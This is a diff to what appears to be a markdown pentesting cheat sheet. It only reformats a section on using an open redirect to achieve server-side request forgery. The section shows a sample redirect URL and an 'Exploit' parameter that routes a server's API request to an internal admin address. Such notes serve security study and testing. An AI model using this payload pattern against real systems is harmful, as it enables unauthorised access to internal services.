@@ -62,18 +62,18 @@ Difficult to exploit because you will be able to exploit only well-known vulnera
 
 1. Identify endpoint with open redirect
 
-```md
-https://website.com/login?redirect=/my-account
-```
+    ```md
+    https://website.com/login?redirect=/my-account
+    ```
 
-1. Have the server execute a request that performs a redirect
+2. Have the server execute a request that performs a redirect
 
-```sh
-# Original
-api=http://website.com/product?productId=6
-# Exploit
-api=http://website.com/login?redirect=http://192.168.0.68/admin
-```
+    ```sh
+    # Original
+    api=http://website.com/product?productId=6
+    # Exploit
+    api=http://website.com/login?redirect=http://192.168.0.68/admin
+    ```
 
 ---
 
